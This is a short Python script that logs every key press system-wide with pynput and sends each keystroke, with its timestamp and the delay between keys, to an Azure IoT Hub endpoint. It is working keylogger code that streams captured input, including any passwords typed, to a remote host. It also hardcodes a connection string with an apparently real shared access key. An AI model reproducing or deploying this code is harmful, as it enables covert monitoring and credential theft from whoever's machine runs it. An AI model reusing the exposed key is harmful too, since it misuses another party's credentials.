from pynput.keyboard import Key, Listener
import logging
import time
from azure.iot.device import IoTHubDeviceClient, Message
from datetime import datetime

client = -1
log_dir = ""
last_date = time.time()
CONNECTION_STRING = "HostName=andreiiot.azure-devices.net;DeviceId=keyboard;SharedAccessKey=fS8J0lZo5EgXv81d11lJbiY9E8jz8l49ZbTjArowghc="
MSG_TXT = '{{"date_and_time": {date_and_time}, "key": {key},"time_between_keys": {time_between_keys}}}'



def iothub_client_init():
    # Create an IoT Hub client
    client = IoTHubDeviceClient.create_from_connection_string(CONNECTION_STRING)
    return client

def connection():
    global client 
    client = iothub_client_init() 

def on_press(key):
    global last_date, client

    if client == -1:
       connection()

    clean_key = str(key).replace("'","")
    time_between_keys = str("\"") + str(time.time() - last_date) + str("\"")
    date_and_time = str("\"") + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + str("\"")

    #print(clean_key + ' ' + time_between_keys + ' ' + date_and_time)

    msg_txt_formatted = MSG_TXT.format(date_and_time = date_and_time, key = clean_key, time_between_keys = time_between_keys)

    message = Message(msg_txt_formatted)

    print("Sending message: {}".format(message) )
    client.send_message(message)
    print("Message successfully sent" )
    
    last_date = time.time()

with Listener(on_press=on_press) as listener:
    listener.join()
    

    